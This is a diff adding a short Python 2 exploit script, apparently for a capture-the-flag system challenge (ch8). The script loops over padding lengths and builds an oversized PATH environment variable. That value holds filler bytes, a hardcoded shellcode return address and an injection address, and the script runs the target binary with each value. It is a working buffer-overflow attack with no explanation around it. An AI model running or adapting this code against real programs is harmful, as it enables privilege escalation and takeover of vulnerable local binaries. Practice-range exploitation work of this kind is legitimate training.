@@ -1,0 +1,11 @@
+#!/usr/bin/python
+import os, sys
+
+shellcode_addr = "\xb5\xfb\xff\xff"
+inject_addr = "\x5e\xf7\xff\xbf"
+
+for cur_before in range(159,161):
+	for cur_after in range(498,502):
+		curpath = "A" * cur_before + shellcode_addr + inject_addr + "C" * cur_after
+		print "\nbef=%d aft=%d" % (cur_before, cur_after)
+		os.system("/usr/bin/env PATH=" + curpath + " /challenge/app-systeme/ch8/ch8")
